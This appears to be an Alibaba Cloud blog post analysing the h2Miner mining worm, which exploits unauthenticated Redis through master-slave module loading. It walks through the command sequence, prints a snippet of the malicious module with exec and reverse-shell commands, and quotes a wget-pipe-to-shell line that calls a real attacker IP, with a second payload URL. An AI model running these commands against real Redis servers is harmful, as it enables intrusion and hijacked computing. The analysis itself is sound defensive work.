In this post, we'll discuss the recent outbreak of h2Miner worms, which exploit Redis's
Remote Command Execution (RCE), and also share some useful security tips by the Alibaba
Cloud Security team.
By Cang Po, with special thanks to Sang Duo.
Recently, Alibaba Cloud's security team detected a sudden outbreak of h2Miner mining
botnet worms. This type of malicious worm uses unauthorized or weak passwords for Redis
as gateways to your systems, then synchronizes its own malicious module with that of an
associated server through master-slave synchronization, and finally loads this malicious
module on the target machine and executes malicious instructions.
In the past, attacks to your systems were mainly done through a method that involved
scheduled tasks or SSH keys that were written to your target machine after the attacker logs
into Redis. Fortunately, this method often doesn't succeed to penetrate your system due to

permission control or system versioning complications. Nonetheless, this loading module
method can directly execute arbitrary instructions or obtain the relevant shell interactive
environment, which is harmful to your system.
Due to the large number of Redis systems hosted online (nearly 1 million), Alibaba Cloud's
security team, as a friendly reminder to our customers, recommends that users do not
expose their Redis service to the public network and check the strength of their passwords
regularly and also check whether they are affected by worms in a timely manner.
Of course, another effective means of protecting your systems is to purchase some of the
relevant security products and services from Alibaba Cloud's large portfolio of security
products and solutions to prevent further malicious attacks. Some of our most popular
products include our Anti-DDoS product packages, such as Anti-DDoS Basic, Anti-DDoS Pro
and Anti-DDoS Premium packages, as well as our Web Application Firewall. You can contact
our sales team to learn which security products are suitable for your needs.

H2Miner Gang
h2Miner is a mining botnet under Linux, which can invade your system through various
different means including the hadoop yarn unauthorized vulnerability, the vulnerability that
involves unauthorized access to Docker, and Redis's Remote Command Execution (RCE)
vulnerability. The mining botnet works by downloading malicious scripts and malicious
programs for mining your precious data, horizontal scanning expansion Attack surface and
maintain Command and Control (C&C) communication.

Redis RCE
Knowledge of this issues was shared by Pavel Toporkov at ZeroNights 2018. After version
4.0, Redis supports the function of loading external modules, which provides users with the
option for loading so files compiled with C in Redis to achieve specific Redis commands.
This function although useful, introduced a vulnerability, where, in Redis master-slave mode,
files could be synchronized to the slave through the fullresync mode to complete the
transmission of malicious so files. After completing the transfer, the attackers load module on
the target Redis and execute any instruction.

Worm Analysis
Recently, the Alibaba Cloud security team discovered that the size of the h2Miner group
suddenly increased sharply. According to their analysis, the overall process of how an attack
occurs is as follows:

2/8

h2Miner mainly uses Redis's RCE to complete the intrusion. First, attackers use
unauthorized or weak passwords to gain access to Redis servers. Then, they use config
set dbfilename red2.so to modify the save file name. After that, attackers use the
slaveof command to set the host address of the master-slave replication. When the target
Redis service establishes a master-slave connection with the malicious Redis service owned
by the attacker, the attacker controls the malicious Redis to send fullresync command for
file synchronization, then the red2.so file will be written on the target machine. After this,
attackers use module load ./red2.so to load this so file. This module can execute
arbitrary instructions or initiate a reverse connection to obtain the shell environment
according to the parameters passed in.
if (RedisModule_CreateCommand(ctx, "system.exec",
DoCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
return REDISMODULE_ERR;
if (RedisModule_CreateCommand(ctx, "system.rev",
RevShellCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
return REDISMODULE_ERR;

After executing a malicious instruction such as / bin / sh -c wget -q -Ohttp://195.3.146.118/unk.sh | sh> / dev / null 2> & 1 , the attacker will reset the
backup file name and use module unload to unload the system module to clear the
corresponding traces. However, the red2.so file still remains on the attacked host. Users
are advised to pay attention to whether there is such a suspicious file in their Redis service
directory.
In addition to killing some malicious processes to steal resources, the attacker followed up
the malicious script by downloading and running malicious binary files to
http://142.44.191.122/kinsing . This means that the process name or directory name
containing kinsing on the host may indicate that this machine has been infected by the
worm.
According to the results of the simple reverse analysis, the malicious program mainly has the
following functions:
Download the file and execute
Execute the mining program
Maintain C&C communication and execute commands

Use masscan to scan externally to expand the influence. In addition, the IP address of the
C&C server is hard-coded in the program, and the affected host will communicate with the
C&C communication server in the form of HTTP, where the information of the zombie
(hacked server) is identified in the HTTP header.

Security Advice
To our customers, we have the following recommendations. First, Redis should not be
exposed to the Internet and should be secured with a strong password. Next, it is important
the customers check whether the red2.so file is left in the Redis path or the file
name/process name on the host contains kinsing
